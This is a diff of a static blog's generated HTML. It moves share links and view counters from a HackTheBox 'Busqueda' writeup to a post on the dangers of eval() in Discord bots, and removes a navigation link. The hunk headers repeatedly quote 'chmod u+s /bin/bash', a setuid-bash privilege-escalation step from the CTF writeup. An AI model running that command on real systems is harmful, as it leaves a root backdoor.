       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/writeups/hackthebox/busqueda/&amp;quote=Busqueda%20Writeup%20-%20HackTheBox"
+      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;quote=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1475,7 +1477,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=http://localhost:1313/writeups/hackthebox/busqueda/&amp;subject=Busqueda%20Writeup%20-%20HackTheBox"
+      href="mailto:?body=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;subject=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1504,8 +1506,8 @@ chmod u+s /bin/bash
           
         
       <script>
-        var oid = "views_writeups\/HackTheBox\/Busqueda\/index.md"
-        var oid_likes = "likes_writeups\/HackTheBox\/Busqueda\/index.md"
+        var oid = "views_research\/Learn how eval() function is evil for discord bots\/index.md"
+        var oid_likes = "likes_research\/Learn how eval() function is evil for discord bots\/index.md"
       </script>
       
       
@@ -1516,41 +1518,6 @@ chmod u+s /bin/bash
   <footer class="pt-8 max-w-prose print:hidden">
 
     
-  
-    
-    
-    
-    <div class="pt-8">
-      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
-      <div class="flex justify-between pt-3">
-        <span>
-          
-            <a class="flex group mr-3" href="/writeups/hackthebox/blurry/">
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Blurry Writeup - HackTheBox</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                </span>
-              </span>
-            </a>
-          
-        </span>
-        <span>
-          
-        </span>
-      </div>
-    </div>
   
 
 
